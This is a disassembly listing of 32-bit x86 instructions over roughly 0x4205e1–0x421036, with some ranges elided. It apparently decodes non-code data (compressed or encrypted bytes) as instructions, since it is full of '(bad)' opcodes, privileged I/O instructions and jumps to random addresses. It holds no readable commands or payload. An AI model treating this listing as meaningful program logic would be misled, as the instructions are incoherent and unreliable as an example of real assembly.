  4205e1:	out    0xb1,eax
  4205e3:	mov    dl,0xc5
  4205e5:	call   FWORD PTR [ebx+0x71]
  4205e8:	mov    edi,0xd7c2bb13
  4205ed:	lds    edi,FWORD PTR [eax+0x32]
  4205f0:	ins    DWORD PTR es:[edi],dx
  4205f1:	je     0x4205a8
  4205f3:	out    dx,eax
  4205f4:	popa   
  4205f5:	ss adc dh,dh
  4205f8:	retf   
  4205f9:	mov    ds:0x3fa29e59,eax
  4205fe:	out    dx,al
  4205ff:	gs popa 
  420601:	pop    ss
  420602:	mov    esp,0xf5f2f0d4
  420607:	dec    ebx
  420608:	mov    edx,0x1dfb7860
  42060d:	fldcw  WORD PTR [esi-0x29]
	...
  420674:	test   BYTE PTR [eax-0x48],ch
  420677:	or     ah,bh
  420679:	fdiv   DWORD PTR [esp+ebp*8+0x78d500c5]
  420680:	xchg   edx,eax
  420681:	repz cmp DWORD PTR [ecx],0x158f0
  420688:	add    al,0x1
  42068a:	add    BYTE PTR [eax],al
  42068c:	or     ch,BYTE PTR [edi]
  42068e:	sar    BYTE PTR [eax+ecx*8+0x43],cl
  420692:	sti    
  420693:	cmp    DWORD PTR [edi],0x4c
  420696:	mov    BYTE PTR [edx+0x590b4f9a],al
  42069c:	adc    DWORD PTR [ecx],esp
  42069e:	ins    WORD PTR es:[edi],dx
  4206a0:	push   ds
  4206a1:	mov    ah,0x53
  4206a3:	adc    al,0xdc
  4206a5:	mov    eax,0xec831028
  4206aa:	jmp    0x8d7f11ac
  4206af:	pop    edi
  4206b0:	xchg   ebx,eax
  4206b1:	xchg   ecx,eax
  4206b2:	mov    al,ds:0x9924a406
  4206b7:	ds loopne 0x420660
  4206ba:	inc    esp
  4206bb:	lea    eax,[ecx-0xb3b0a48]
  4206c1:	pop    eax
  4206c2:	loope  0x42068b
  4206c4:	and    DWORD PTR [ebx-0x18],esi
  4206c7:	fwait
  4206c8:	jno    0x42069a
  4206ca:	add    eax,0x42ea802f
  4206cf:	ja     0x42068a
  4206d1:	mov    bh,0x44
  4206d3:	or     DWORD PTR [eax+0x7ccfab1],ecx
  4206d9:	or     ebp,esi
  4206db:	add    al,0xcd
  4206dd:	not    BYTE PTR [ecx]
  4206df:	mov    al,ds:0xf7eb26ad
  4206e4:	mul    DWORD PTR [esi-0x47]
  4206e7:	or     DWORD PTR [edx],ebp
  4206e9:	outs   dx,BYTE PTR ds:[esi]
  4206ea:	mov    ebp,ds
  4206ec:	dec    ecx
  4206ed:	sti    
  4206ee:	sub    eax,0x94b27baf
  4206f3:	cwde   
  4206f4:	sbb    BYTE PTR [esi],dh
  4206f6:	inc    esi
  4206f7:	lahf   
  4206f8:	call   0xb967:0xa29f62a7
  4206ff:	popf   
  420700:	lahf   
  420701:	(bad)  
  420703:	inc    edx
  420704:	gs mov dl,0x0
  420707:	in     al,dx
  420708:	in     eax,0xf9
  42070a:	mov    ds,WORD PTR [edx]
  42070c:	adc    DWORD PTR [edx],0xfffffff9
  42070f:	call   0xd1407074
  420714:	test   eax,0x44d71f47
  420719:	inc    eax
  42071a:	outs   dx,BYTE PTR ds:[esi]
  42071b:	pop    edi
  42071c:	pop    esi
  42071d:	dec    edi
  42071e:	out    dx,eax
  42071f:	jmp    0x4206b7
  420721:	sti    
  420722:	int3   
  420723:	dec    edx
  420724:	fstp   QWORD PTR [ebx+0x3]
  420727:	add    dh,ch
  420729:	lahf   
  42072a:	add    BYTE PTR [esi-0x3c],bl
  42072d:	cmp    al,0x96
  42072f:	mov    DWORD PTR ds:0x49c6665f,ecx
  420735:	adc    dh,BYTE PTR [edx+0x1fccd19e]
  42073b:	shr    DWORD PTR [ebp-0x4a],1
  42073e:	adc    BYTE PTR [edx],bh
  420740:	cmp    BYTE PTR [ecx+edx*8+0x2c],cl
  420744:	lods   al,BYTE PTR ds:[esi]
  420745:	out    0x6b,eax
  420747:	aas    
  420748:	scas   eax,DWORD PTR es:[edi]
  420749:	cmp    DWORD PTR [ebx+0x7d624e18],ebp
  42074f:	aam    0x10
  420751:	pop    edi
  420752:	dec    ebp
  420753:	dec    esi
  420754:	ret    0x9dc6
  420757:	and    al,0x46
  420759:	icebp  
  42075a:	xchg   esp,eax
  42075b:	jb     0x4206f4
  42075d:	mov    bl,BYTE PTR [edi-0x35]
  420760:	mov    dl,0xac
  420762:	or     al,0xf8
  420764:	cmp    al,0x29
  420766:	adc    al,0xf9
  420768:	jae    0x420798
  42076a:	mov    cl,0x62
  42076c:	mov    edx,0xe38b104a
  420771:	mov    BYTE PTR [esi],dh
  420773:	push   eax
  420774:	jns    0x420760
  420776:	jle    0x4207d2
  420778:	sti    
  420779:	sub    BYTE PTR ds:0xcc4665e2,bh
  42077f:	xor    DWORD PTR [esi],eax
  420781:	pop    edx
  420782:	repz push ecx
  420784:	stc    
  420785:	mov    ebx,0xf2ec0828
  42078a:	sub    BYTE PTR [edx+0x2b],0xf0
  42078e:	mov    esp,0x71
	...
  4207f3:	add    BYTE PTR [ecx-0x587fdad1],cl
  4207f9:	mov    ch,BYTE PTR [ebp-0x2390c6d1]
  4207ff:	pusha  
  420800:	cdq    
  420801:	mov    al,ds:0x59f47b65
  420806:	add    DWORD PTR [eax],eax
  420808:	add    al,0x1
  42080a:	add    BYTE PTR [eax],al
  42080c:	xor    al,0x8f
  42080e:	pop    ecx
  42080f:	cs ins DWORD PTR es:[edi],dx
  420811:	aad    0xe1
  420813:	jns    0x420834
  420815:	fcom   DWORD PTR [edx-0xa]
  420818:	arpl   WORD PTR [esi],bx
  42081a:	das    
  42081b:	and    eax,DWORD PTR [eax-0x17c528df]
  420821:	add    eax,0xd807804
  420826:	jmp    0xd8aa:0x52dfc5d
  42082d:	addr16 int 0xfe
  420830:	out    0xee,eax
  420832:	test   dh,dh
  420834:	imul   esi,eax,0x41
  420837:	aad    0xcf
  420839:	daa    
  42083a:	loop   0x42081c
  42083c:	ret    
  42083d:	cld    
  42083e:	nop
  42083f:	sbb    al,0x4c
  420841:	push   edi
  420842:	mov    BYTE PTR [ebp-0x3a],dh
  420845:	cdq    
  420846:	mov    esp,0x2238b06b
  42084b:	mov    edx,0xfaaf2334
  420850:	sub    al,0x3c
  420852:	test   DWORD PTR [esi-0x5bc655c0],ecx
  420858:	into   
  420859:	dec    esp
  42085a:	sbb    eax,DWORD PTR [ebp-0x4d]
  42085d:	sub    eax,0x7983febc
  420862:	(bad)
  420866:	sar    BYTE PTR ds:0x64ad00df,0xde
  42086d:	es cmp eax,0x7d9df4ec
  420873:	pop    edi
  420874:	rcl    DWORD PTR [esi+0xc],cl
  420877:	pop    edx
  420878:	or     BYTE PTR [ecx-0x73],ah
  42087b:	xchg   DWORD PTR ds:0x8b2c5ffd,edi
  420881:	(bad)  
  420882:	lock inc DWORD PTR [bx+si-0x43d4]
  420888:	ficom  WORD PTR gs:[ebx]
  42088b:	jl     0x4208c8
  42088d:	test   DWORD PTR [esp+ebx*8-0x7f],0xb1e5b5cb
  420895:	push   ecx
  420896:	dec    ecx
  420897:	fimul  WORD PTR [edi-0x43]
  42089a:	inc    DWORD PTR [eax]
  42089c:	leave  
  42089d:	mov    ds:0xd8d7d1b8,al
  4208a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208a3:	fwait
  4208a4:	pop    es
  4208a5:	jecxz  0x420871
  4208a7:	sti    
  4208a8:	xor    DWORD PTR [ebx],eax
  4208aa:	and    DWORD PTR [ebp-0x7713936f],edx
  4208b0:	pushf  
  4208b1:	dec    ecx
  4208b2:	jne    0x4208ba
  4208b4:	and    dl,cl
  4208b6:	rol    BYTE PTR [edx+ebp*8-0x7a32ba3d],1
  4208bd:	fxch   st(5)
  4208bf:	popa   
  4208c0:	sub    al,0xc8
  4208c2:	shl    BYTE PTR [edi*8-0x109b5b05],1
  4208c9:	or     DWORD PTR [ecx+edi*2-0x5501c2d6],esi
  4208d0:	sub    cl,BYTE PTR [edi+0x7e92c144]
  4208d6:	dec    ebp
  4208d7:	aad    0x5
  4208d9:	aam    0x10
  4208db:	nop
  4208dc:	inc    eax
  4208dd:	cmp    DWORD PTR [edx],ebp
  4208df:	xchg   edi,eax
  4208e0:	aas    
  4208e1:	push   ebp
  4208e2:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4208e4:	jp     0x420906
  4208e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208e7:	push   0xffffffe7
  4208e9:	sahf   
  4208ea:	jecxz  0x4208cb
  4208ec:	nop    DWORD PTR [ebx]
  4208ef:	mov    bl,0xee
  4208f1:	sub    DWORD PTR [ebx-0x7181286c],ebx
  4208f7:	jb     0x420939
  4208f9:	scas   eax,DWORD PTR es:[edi]
  4208fa:	hlt    
  4208fb:	out    dx,eax
  4208fc:	aas    
  4208fd:	cli    
  4208fe:	adc    eax,0x51
  420901:	jp     0x4208d3
  420903:	adc    BYTE PTR [edi],0xe4
  420906:	sub    esi,DWORD PTR [edx-0x67f77869]
  42090c:	mov    edi,0x9130a
	...
  420971:	add    BYTE PTR [eax],al
  420973:	add    ah,bl
  420975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420976:	jae    0x4209c5
  420978:	jnp    0x420959
  42097a:	(bad)  
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0x1d
  420981:	mov    esi,0x5af8a9fe
  420986:	add    DWORD PTR [eax],eax
  420988:	add    al,0x1
  42098a:	add    BYTE PTR [eax],al
  42098c:	cmp    al,0x7e
  42098e:	imul   ebx,DWORD PTR [eax-0x65fdb65f],0xc06689e2
  420998:	mov    dh,0x14
  42099a:	mov    edx,0xb19ae5e1
  42099f:	pop    es
  4209a0:	jb     0x420a04
  4209a2:	pushf  
  4209a3:	js     0x420a16
  4209a5:	push   edi
  4209a6:	xchg   BYTE PTR [edx-0x74],bl
  4209a9:	and    esi,DWORD PTR [edx-0x70]
  4209ac:	sub    al,0xd1
  4209ae:	mov    ebp,0xc01b1909
  4209b3:	fcmovb st,st(6)
  4209b5:	push   edi
  4209b6:	(bad)  
  4209b7:	arpl   WORD PTR [ecx],sp
  4209b9:	inc    esi
  4209ba:	inc    ebx
  4209bb:	sar    BYTE PTR [esi+0x3f],0xef
  4209bf:	xchg   ebp,eax
  4209c0:	adc    eax,0xc80f7d3c
  4209c5:	fsubr  QWORD PTR [esi+eiz*2-0x3fec97bc]
  4209cc:	inc    ebp
  4209cd:	ja     0x4209cc
  4209cf:	fiadd  WORD PTR [edx]
  4209d1:	jge    0x420a4b
  4209d3:	lods   eax,DWORD PTR ds:[esi]
  4209d4:	sbb    DWORD PTR ds:0x176aad02,ebx
  4209da:	shr    BYTE PTR [edi],0x8
  4209dd:	fs gs ds (bad) 
  4209e1:	sahf   
  4209e2:	sbb    BYTE PTR [edx+ecx*8],ch
  4209e5:	arpl   WORD PTR [ebx],si
  4209e7:	mov    ah,0xd6
  4209e9:	sub    al,0x9a
  4209eb:	gs fs and eax,0x2ac22d1d
  4209f2:	add    esp,edi
  4209f4:	test   DWORD PTR [eax],ebp
  4209f6:	xchg   esp,eax
  4209f7:	inc    BYTE PTR [ecx+0x6e]
  4209fa:	int    0x5b
  4209fc:	cdq    
  4209fd:	dec    ebx
  4209fe:	mov    bl,0x28
  420a00:	adc    ch,ch
  420a02:	jmp    0x5b17ef23
  420a07:	mov    al,0xc9
  420a09:	sbb    eax,0xc98600ae
  420a0e:	push   0x9d3df8c0
  420a13:	jle    0x42099e
  420a15:	push   esi
  420a16:	mov    ecx,0xe0feabff
  420a1b:	dec    ebx
  420a1c:	pop    edi
  420a1d:	lods   al,BYTE PTR ds:[esi]
  420a1e:	push   ebx
  420a1f:	in     eax,dx
  420a20:	dec    edi
  420a21:	mov    bl,0xc0
  420a23:	outs   dx,BYTE PTR ds:[esi]
  420a24:	pop    ebp
  420a25:	cdq    
  420a26:	or     esp,esi
  420a28:	inc    eax
  420a29:	pop    ebp
  420a2a:	imul   edi,DWORD PTR [ebx+0x5d32bcab],0x24
  420a31:	sahf   
  420a32:	sbb    DWORD PTR ds:0x45404721,edx
  420a38:	pop    ebp
  420a39:	inc    esi
  420a3a:	out    dx,al
  420a3b:	in     eax,dx
  420a3c:	jle    0x4209ea
  420a3e:	and    al,0x36
  420a40:	and    DWORD PTR [edx-0x11],esp
  420a43:	repz shr DWORD PTR ds:[eax-0x4118231c],1
  420a4b:	add    eax,DWORD PTR [ebp+eax*4+0x3b]
  420a4f:	loopne 0x420a91
  420a51:	loope  0x420a34
  420a53:	dec    eax
  420a54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a55:	in     eax,0xf8
  420a57:	js     0x420a35
  420a59:	mov    ebx,0xf5f5c36
  420a5e:	(bad)  
  420a5f:	sahf   
  420a60:	push   cs
  420a61:	cmp    eax,0x689b9ca0
  420a66:	lock xchg edx,eax
  420a68:	adc    BYTE PTR [edi+0x605e24d9],al
  420a6e:	test   al,0x45
  420a70:	jmp    0x59884302
  420a75:	ds jp  0x420a38
  420a78:	push   0x24d67095
  420a7d:	out    dx,eax
  420a7e:	out    0x96,al
  420a80:	out    0x69,al
  420a82:	push   ds
  420a83:	fwait
  420a84:	lahf   
  420a85:	adc    ecx,DWORD PTR [edx*2+0x46028787]
  420a8c:	out    0x4e,eax
  420a8e:	push   0xec
	...
  420af3:	add    bh,bl
  420af5:	xor    ch,BYTE PTR [edi-0x6010ed]
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	add    BYTE PTR [ebx+0x7f],cl
  420b03:	(bad)  
  420b04:	cld    
  420b05:	pop    ebx
  420b06:	add    DWORD PTR [eax],eax
  420b08:	add    al,0x1
  420b0a:	add    BYTE PTR [eax],al
  420b0c:	mov    ds:0x1ce6e3c5,al
  420b11:	lods   al,BYTE PTR ds:[esi]
  420b12:	pop    edi
  420b13:	xchg   ecx,eax
  420b14:	stos   BYTE PTR es:[edi],al
  420b15:	cmp    BYTE PTR [ebx],bh
  420b17:	(bad)  
  420b18:	out    dx,eax
  420b19:	jge    0x420b64
  420b1b:	add    BYTE PTR [ebp+0x6b6e63f7],dl
  420b21:	aaa    
  420b22:	popa   
  420b23:	push   esp
  420b24:	(bad)  
  420b25:	fs cwde 
  420b27:	mov    edi,0x191c67b5
  420b2c:	xor    DWORD PTR [edi+eax*1+0x6ad0568],esp
  420b33:	shr    BYTE PTR [edi-0x4ffb1b8d],cl
  420b39:	(bad)  
  420b3a:	mov    al,0xde
  420b3c:	jne    0x420bbb
  420b3e:	pop    esi
  420b3f:	imul   eax,ebx,0xffffffef
  420b42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b43:	xchg   esi,eax
  420b44:	or     bl,BYTE PTR [ebp-0x4a9d2fc5]
  420b4a:	jno    0x420b4c
  420b4c:	sbb    edi,DWORD PTR es:[edx]
  420b4f:	adc    ebx,edx
  420b51:	in     eax,dx
  420b52:	adc    DWORD PTR [ebp+0x377c6f2c],ecx
  420b58:	mov    dh,0xf4
  420b5a:	and    DWORD PTR [edi+0x61fbf65e],eax
  420b60:	jo     0x420b48
  420b62:	add    edx,DWORD PTR [ebp+0x4d10a37a]
  420b68:	mov    al,0xd
  420b6a:	push   esp
  420b6b:	cdq    
  420b6c:	icebp  
  420b6d:	pop    eax
  420b6e:	in     eax,0xd1
  420b70:	fucom  st(7)
  420b72:	mov    ebp,0xa156f764
  420b77:	loopne 0x420b17
  420b79:	ja     0x420ba8
  420b7b:	adc    edi,0xa6d6f74d
  420b81:	hlt    
  420b82:	mov    ds:0x9dc1a318,eax
  420b87:	and    ah,bl
  420b89:	mov    dh,0x74
  420b8b:	jb     0x420baf
  420b8d:	sbb    DWORD PTR [edx],edi
  420b8f:	jb     0x420ba5
  420b91:	fs mov esi,0xc2b507c0
  420b97:	xchg   ebx,eax
  420b98:	pop    ds
  420b99:	xchg   edx,eax
  420b9a:	iret   
  420b9b:	add    bh,0xa8
  420b9e:	push   esi
  420b9f:	adc    BYTE PTR [edi+0x7ba17f62],bh
  420ba5:	xlat   BYTE PTR ds:[ebx]
  420ba6:	xchg   esi,eax
  420ba7:	mov    ah,0x51
  420ba9:	pop    ds
  420baa:	aad    0xd1
  420bac:	shl    bh,cl
  420bae:	jecxz  0x420ba2
  420bb0:	hlt    
  420bb1:	hlt    
  420bb2:	mov    ebp,0x2ca11045
  420bb7:	outs   dx,BYTE PTR ds:[esi]
  420bb8:	and    BYTE PTR ds:0x2430d549,dl
  420bbe:	xchg   ebp,eax
  420bbf:	in     eax,0xf1
  420bc1:	cmp    eax,DWORD PTR [edx]
  420bc3:	rol    DWORD PTR [eax+0x49],cl
  420bc6:	sub    eax,0xd45eea53
  420bcb:	jo     0x420c0a
  420bcd:	cmp    al,0x45
  420bcf:	mov    BYTE PTR [esp+eax*4-0x50],0x93
  420bd4:	fstp   st(2)
  420bd6:	sub    bh,ch
  420bd8:	inc    eax
  420bd9:	or     al,0x52
  420bdb:	sub    cl,BYTE PTR [esi]
  420bdd:	add    esi,DWORD PTR [eax-0x3]
  420be0:	clc    
  420be1:	pushf  
  420be2:	add    eax,0x63188729
  420be7:	shl    DWORD PTR [esi-0x59],1
  420bea:	push   es
  420beb:	dec    ebx
  420bec:	dec    edx
  420bed:	mov    WORD PTR ds:0x18788e48,es
  420bf3:	aas    
  420bf4:	es aad 0xf4
  420bf7:	loopne 0x420b7d
  420bf9:	push   ss
  420bfa:	call   DWORD PTR [eax+0x65c9e182]
  420c00:	or     DWORD PTR [ecx-0x1c],ebx
  420c03:	inc    ch
  420c05:	invd   
  420c07:	add    BYTE PTR [esi-0x7a217be7],bh
  420c0d:	mov    edi,0xc71b
	...
  420c72:	add    BYTE PTR [eax],al
  420c74:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420c7a:	mov    edx,0x1886e3f
  420c7f:	in     eax,0xbc
  420c81:	nop
  420c82:	mov    sp,0x5d00
  420c86:	add    DWORD PTR [eax],eax
  420c88:	add    al,0x1
  420c8a:	add    BYTE PTR [eax],al
  420c8c:	outs   dx,BYTE PTR ds:[esi]
  420c8d:	clc    
  420c8e:	test   BYTE PTR [ebx+0x5129fc5b],0x9b
  420c95:	lds    edi,FWORD PTR [esi+0x640642c8]
  420c9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c9c:	cmp    eax,0xe5e6f983
  420ca1:	cmp    al,0xe9
  420ca3:	mov    ds:0xf3b3958a,al
  420ca8:	xor    dl,bl
  420caa:	push   es
  420cab:	call   0xacbe9808
  420cb0:	jo     0x420d25
  420cb2:	and    al,0xc8
  420cb4:	dec    ecx
  420cb5:	retf   
  420cb6:	cmp    edi,DWORD PTR [ecx-0x6c]
  420cb9:	sbb    BYTE PTR [edi+0x77bbd8e3],al
  420cbf:	jno    0x420cce
  420cc1:	and    BYTE PTR [edi+0x62250eb1],al
  420cc7:	or     DWORD PTR [ebp+0x39e26344],esp
  420ccd:	retw   0x8f8d
  420cd1:	frstor [edx-0x73]
  420cd4:	pushf  
  420cd5:	jmp    0x420d2c
  420cd7:	outs   dx,BYTE PTR ds:[esi]
  420cd8:	sbb    al,0xed
  420cda:	push   edi
  420cdb:	ret    
  420cdc:	imul   esp,DWORD PTR [esi-0x5791feff],0xbf88ee87
  420ce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ce7:	sbb    ebp,esi
  420ce9:	sti    
  420cea:	add    ch,BYTE PTR [ebp-0x476abd1d]
  420cf0:	xor    ah,al
  420cf2:	sbb    ebx,ebp
  420cf4:	sbb    edx,edx
  420cf6:	cmp    DWORD PTR [ebp+eax*4-0x3b],eax
  420cfa:	pop    esi
  420cfb:	mov    ds:0x57f9d75b,al
  420d00:	leave  
  420d01:	std    
  420d02:	sub    DWORD PTR ds:0x7a4c,0xfffffff5
  420d08:	jecxz  0x420d54
  420d0a:	xlat   BYTE PTR ds:[ebx]
  420d0b:	in     al,0x33
  420d0d:	in     eax,dx
  420d0e:	add    eax,0xe508ba84
  420d13:	(bad)  
  420d14:	aad    0x78
  420d16:	push   ss
  420d17:	fsubr  QWORD PTR [edi-0x65f244e7]
  420d1d:	repnz pop esi
  420d1f:	xor    eax,0xc06f8c18
  420d24:	jge    0x420d1b
  420d26:	push   edi
  420d27:	shr    DWORD PTR [esi+edi*8],0xd9
  420d2b:	into   
  420d2c:	push   cs
  420d2d:	retf   
  420d2e:	mov    dl,0xa0
  420d30:	adc    DWORD PTR [eax-0x3b],0x3712736c
  420d37:	adc    eax,0x2c785b1f
  420d3c:	xchg   DWORD PTR [ecx+edx*8-0x47f98723],ecx
  420d43:	sub    eax,0x90cc4d0c
  420d48:	cmp    edi,DWORD PTR [ebx+0x16c47eba]
  420d4e:	out    0xca,al
  420d50:	sub    bh,BYTE PTR [ecx+0xef06b85]
  420d56:	mov    bh,0x85
  420d58:	cli    
  420d59:	int    0xf7
  420d5b:	sar    BYTE PTR [edx-0x6ede53b2],0xaf
  420d62:	push   es
  420d63:	or     bh,BYTE PTR [esi-0x3796c7ba]
  420d69:	out    0x1f,eax
  420d6b:	aam    0x95
  420d6d:	idiv   BYTE PTR [eax-0xf]
  420d70:	xchg   esp,eax
  420d71:	push   ebp
  420d72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d73:	push   edi
  420d74:	sub    al,0x42
  420d76:	(bad)  
  420d77:	cld    
  420d78:	das    
  420d79:	sbb    BYTE PTR [edx-0x72],0x2
  420d7d:	es mov esi,0x741b0e3a
  420d83:	ret    0x7d5a
  420d86:	push   cs
  420d87:	inc    ebp
  420d88:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d8a:	jbe    0x420d12
  420d8c:	js     0x420d58
  420d8e:	or     dh,BYTE PTR [eax+eax*1]
	...
  420df1:	add    BYTE PTR [eax],al
  420df3:	add    bh,ah
  420df5:	push   ds
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0x25203bf1
  420e04:	add    al,0x5e
  420e06:	add    DWORD PTR [eax],eax
  420e08:	add    al,0x1
  420e0a:	add    BYTE PTR [eax],al
  420e0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e0d:	push   ss
  420e0e:	cmp    BYTE PTR [ebx-0x2c],al
  420e11:	mov    cl,0xf4
  420e13:	int3   
  420e14:	stos   BYTE PTR es:[edi],al
  420e15:	push   edx
  420e16:	push   ebx
  420e17:	scas   al,BYTE PTR es:[edi]
  420e18:	call   0x137ad54
  420e1d:	dec    esp
  420e1e:	push   cs
  420e1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e20:	sbb    bh,0xd8
  420e23:	inc    edx
  420e24:	push   ecx
  420e25:	mov    dl,0x48
  420e27:	xchg   ebp,eax
  420e28:	sub    BYTE PTR ds:0x212c025e,0xdd
  420e2f:	out    dx,al
  420e30:	scas   al,BYTE PTR es:[edi]
  420e31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e32:	pop    ds
  420e33:	mov    edx,0x505f6db8
  420e38:	mov    WORD PTR [ebp-0x7c],?
  420e3b:	addr16 out 0xe6,al
  420e3e:	dec    edi
  420e3f:	xchg   ebx,eax
  420e40:	xor    eax,0x32a0d0cd
  420e45:	jmp    0x420eb4
  420e47:	lahf   
  420e48:	sbb    esi,ebp
  420e4a:	cmp    BYTE PTR [edi+0x7224556f],al
  420e50:	pop    ebx
  420e51:	add    al,0x7b
  420e53:	jno    0x420ec6
  420e55:	fidiv  WORD PTR [eax+0x46b8645f]
  420e5b:	aam    0x2b
  420e5d:	or     BYTE PTR [ecx],bh
  420e5f:	dec    ecx
  420e60:	sbb    BYTE PTR [ebx-0x363194a8],bh
  420e66:	or     bh,dl
  420e68:	dec    edi
  420e69:	pusha  
  420e6a:	jmp    0x420ed0
  420e6c:	sub    al,0x44
  420e6e:	pop    esi
  420e6f:	sbb    al,0x97
  420e71:	test   DWORD PTR [ecx+0x69],ebp
  420e74:	shl    DWORD PTR [ebx+esi*4-0x47be601],1
  420e7b:	pandn  mm0,QWORD PTR [ecx+0x6d]
  420e7f:	mov    dh,0x94
  420e81:	adc    BYTE PTR [eax+0x71],al
  420e84:	sub    edx,DWORD PTR [edx-0x7d]
  420e87:	imul   BYTE PTR [ecx]
  420e89:	cmp    BYTE PTR [edi+0x0],0x41
  420e8d:	add    al,0xba
  420e8f:	je     0x420e70
  420e91:	and    cl,al
  420e93:	sub    BYTE PTR ds:0xc94b5643,bl
  420e99:	test   al,0x28
  420e9b:	in     eax,dx
  420e9c:	add    eax,0xf06b2c0d
  420ea1:	sub    al,0x17
  420ea3:	and    al,0xc0
  420ea5:	adc    al,0xe
  420ea7:	mov    dl,0x39
  420ea9:	push   0xceabb0c
  420eae:	push   0xffffffa9
  420eb0:	data16 jo 0x420e7a
  420eb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420eb4:	stc    
  420eb5:	sbb    DWORD PTR [eax-0x16],0xffffffad
  420eb9:	inc    esi
  420eba:	cmp    BYTE PTR [edx],bh
  420ebc:	inc    edx
  420ebd:	or     BYTE PTR [eax+ebp*1],ch
  420ec0:	std    
  420ec1:	inc    eax
  420ec2:	add    edx,DWORD PTR [ecx+ebx*2-0x6145a1cb]
  420ec9:	push   ebx
  420eca:	fnsave [esi+0x1888ccd9]
  420ed0:	das    
  420ed1:	daa    
  420ed2:	push   ds
  420ed3:	aaa    
  420ed4:	test   BYTE PTR [eax+0x78],dh
  420ed7:	jns    0x420ef8
  420ed9:	rcr    DWORD PTR ds:0x25d063d4,0xd5
  420ee0:	cwde   
  420ee1:	jne    0x420eb3
  420ee3:	push   0xcac45e1
  420ee8:	call   0x5f10039c
  420eed:	sbb    esp,edi
  420eef:	inc    eax
  420ef0:	sbb    eax,0x36345b08
  420ef5:	inc    ebx
  420ef6:	cld    
  420ef7:	or     BYTE PTR [ebx-0x7b],ch
  420efa:	fimul  DWORD PTR [ecx-0x6b]
  420efd:	dec    ebx
  420efe:	shl    esp,0xd0
  420f01:	adc    BYTE PTR [eax-0x7c56e5b3],bh
  420f07:	xchg   ebp,eax
  420f08:	(bad)  
  420f09:	xchg   edi,eax
  420f0a:	retf   0x6149
  420f0d:	test   BYTE PTR [edi+0x71],dh
	...
  420f74:	and    BYTE PTR [edi-0x28082cbe],dl
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi+0x3d340b64]
  420f84:	or     BYTE PTR [edi+0x1],bl
  420f87:	add    BYTE PTR [ecx+eax*1],al
  420f8a:	add    BYTE PTR [eax],al
  420f8c:	and    esi,DWORD PTR [ecx-0x6f]
  420f8f:	test   al,0xec
  420f91:	enter  0xd852,0x3d
  420f95:	cmp    DWORD PTR es:[ecx],ebp
  420f98:	sbb    BYTE PTR [esi],0xbd
  420f9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f9c:	nop
  420f9d:	push   ss
  420f9e:	cmp    bh,bh
  420fa0:	imul   eax,DWORD PTR [ebx],0xeaae30ae
  420fa6:	push   edx
  420fa7:	arpl   WORD PTR [esi+0x43f8e3d9],ax
  420fad:	add    DWORD PTR es:[ecx+0x2c],ecx
  420fb1:	scas   al,BYTE PTR es:[edi]
  420fb2:	xchg   edx,eax
  420fb3:	popa   
  420fb4:	add    DWORD PTR [edi-0x69],esi
  420fb7:	js     0x420ff2
  420fb9:	mov    bl,BYTE PTR [edi+0x20]
  420fbc:	push   esi
  420fbd:	pushf  
  420fbe:	cmp    BYTE PTR [eax],cl
  420fc0:	jge    0x420fac
  420fc2:	xor    DWORD PTR [edi+ebx*8-0x32],0x20fb18c2
  420fca:	pushf  
  420fcb:	test   ch,ch
  420fcd:	lods   al,BYTE PTR ds:[esi]
  420fce:	dec    ecx
  420fcf:	scas   eax,DWORD PTR es:[edi]
  420fd0:	xchg   edi,eax
  420fd1:	sbb    eax,0x29538970
  420fd6:	cmp    edx,DWORD PTR [esi+ebx*1+0x32]
  420fda:	sub    al,0xeb
  420fdc:	inc    esp
  420fdd:	xchg   DWORD PTR [eax+0x2991154f],esi
  420fe3:	add    eax,ecx
  420fe5:	in     al,dx
  420fe6:	inc    eax
  420fe7:	mov    ds,esp
  420fe9:	sar    DWORD PTR [edi],cl
  420feb:	inc    edx
  420fec:	ins    DWORD PTR es:[edi],dx
  420fed:	mov    cl,0xd4
  420fef:	std    
  420ff0:	aas    
  420ff1:	enter  0x1551,0xfc
  420ff5:	dec    eax
  420ff6:	lea    eax,[ecx+0x6c]
  420ff9:	loop   0x421029
  420ffb:	(bad)  
  420ffd:	xor    eax,ecx
  420fff:	mov    esi,0xbc824d10
  421004:	pop    eax
  421005:	rcr    DWORD PTR [esi],0x57
  421008:	out    0xc2,al
  42100a:	fidiv  DWORD PTR [ecx+edx*1]
  42100d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42100e:	sbb    al,BYTE PTR [edi-0x3a9d0cc4]
  421014:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421015:	push   esi
  421016:	inc    ecx
  421017:	mov    WORD PTR ds:0x80546cf5,ds
  42101d:	xchg   esi,eax
  42101e:	dec    ebp
  42101f:	lds    esi,FWORD PTR ds:0xe50887b2
  421025:	mov    esi,0x5f3409f3
  42102a:	ins    BYTE PTR es:[edi],dx
  42102b:	dec    ecx
  42102c:	jl     0x42107b
  42102e:	imul   eax,DWORD PTR [bp+si+0x59cf],0x45
  421034:	int3   
  421035:	inc    ebx
  421036:	xor    DWORD PTR [ecx-0x70],0x82a67112
